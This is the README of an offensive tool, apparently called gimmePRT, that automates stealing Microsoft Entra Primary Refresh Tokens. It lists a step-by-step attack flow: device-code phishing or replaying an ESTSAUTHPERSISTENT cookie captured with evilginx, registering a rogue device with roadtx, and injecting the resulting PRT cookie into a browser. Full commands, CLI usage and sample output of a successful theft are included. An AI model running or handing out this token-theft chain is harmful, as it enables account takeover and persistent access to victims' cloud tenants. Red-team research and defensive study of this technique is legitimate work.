# gimmePRT

This code is based on the research done by [Dirk-jan](https://x.com/_dirkjan) via this [blog post](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/). The code heavily relies on the [ROADtools](https://github.com/dirkjanm/ROADtools) library and much of the functionality is taken directly from [roadtx](https://github.com/dirkjanm/ROADtools/tree/master/roadtx).  Credit to [kiwids](https://x.com/mhskai2017) for his original automation [script](https://github.com/kiwids0220/deviceCode2WinHello) linked in Dirk-jan's blog.  

The idea of this tool is to create a single point of entry for automagically getting a useable PRT using ROADlib. An example attack flow using roadtx that this is aiming to replicate would look like:
```
1a. SquarePhish/Device code with the following details:

    client_id: 29d9ed98-a469-4536-ade2-f981bc1d605e (Microsoft Authentication Broker)
    resource:  https://enrollment.manage.microsoft.com/

1b. If you have a ESTSAUTHPERSISTENT cookie from evilginx/browser dump,
    replicate the above:

    $ roadtx interactiveauth -c 29d9ed98-a469-4536-ade2-f981bc1d605e \
                             -r https://enrollment.manage.microsoft.com/ \
                             -ru https://login.microsoftonline.com/applebroker/msauth \
                             --estscookie <ESTSAUTHPERSISTENT>

----------

2. Once you have the refresh token, request a new access token with the correct resource:

   client_id: 29d9ed98-a469-4536-ade2-f981bc1d605e (Microsoft Authentication Broker)
   resource:  urn:ms-drs:enterpriseregistration.windows.net

   $ roadtx gettokens --refresh-token file \
                      -c 29d9ed98-a469-4536-ade2-f981bc1d605e \
                      -r drs

3. Use `roadtx` (ROADTools) to join/register a device

   $ roadtx device -a join -n dcflow

4. With the newly joined device, request a PRT

   $ roadtx prt --refresh-token <TOKEN> \
                -c dcflow.pem \
                -k dcflow.key

5. Plug the PRT into the browser to initiate the SSO flow

   cookie_name:  `x-ms-RefreshTokenCredential`
   cookie_value: `<PRT_TOKEN>`

6. If needed, expand the permissions of the PRT token

   $ roadtx prtauth -c msteams -r msgraph
```

## Usage

```
usage: gimmePRT.py [-h] [--device-name DEVICE_NAME] [--windows-version WINDOWS_VERSION]
                   [--debug] {refresh,cookie} ...

-*- GIMME PRT -*-

positional arguments:
  {refresh,cookie}
    refresh             Convert refresh token to PRT
    cookie              Convert Microsoft ESTS cookie to PRT

options:
  -h, --help            show this help message and exit

  --device-name DEVICE_NAME
                        device name when joining (default: DESKTOP-XXXXXXXX)

  --windows-version WINDOWS_VERSION
                        windows versions for the joined device (default: 10.0.19041.928)

  --debug               enable debugging
```

```
usage: gimmePRT.py cookie [-h] --estsauth ESTSAUTH

options:
  -h, --help           show this help message and exit

  --estsauth ESTSAUTH  ESTSAUTHPERSISTENT cookie from evilginx/browser dump
```

```
usage: gimmePRT.py refresh [-h] -t TOKEN

options:
  -h, --help            show this help message and exit

  -t TOKEN, --token TOKEN
                        refresh token from SquarePhish/device code flow
```

### Requirements

```sh
$ pip3 install roadtools roadtx colorama

# geckodriver is expected in the current path, below is an example download
$ wget https://github.com/mozilla/geckodriver/releases/download/v0.33.0/geckodriver-v0.33.0-linux-aarch64.tar.gz && \
  tar -xvf geckodriver-v0.33.0-linux-aarch64.tar.gz
```

### Example

```
❯ python3 -i gimmePRT.py cookie --estsauth "0.AWXXXXXXXXXXXXX..."

[2024-07-05 03:26:37,539] info | Converting ESTSAUTHPERSISTENT cookie to a useable Refresh Token
[2024-07-05 03:26:52,454] info | Successfully converted cookie to refresh token
[2024-07-05 03:26:54,515] info | Swapping refresh token to the correct resource URI
[2024-07-05 03:26:56,304] info | Successfully swapped token resource URI
[2024-07-05 03:26:57,099] info | Registering and joining device to the domain
    Saving private key to device.key
    Registering device
    Device ID: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
    Saved device certificate to device.pem
[2024-07-05 03:27:02,331] info | Successfully joined device
[2024-07-05 03:27:10,671] info | Obtained PRT:
    0.AWXXXXXXXXXXXXX...
[2024-07-05 03:27:10,671] info | Obtained session key: XXXXXXXX...
    Saved PRT to prt.txt
    Device was deleted in Azure AD
```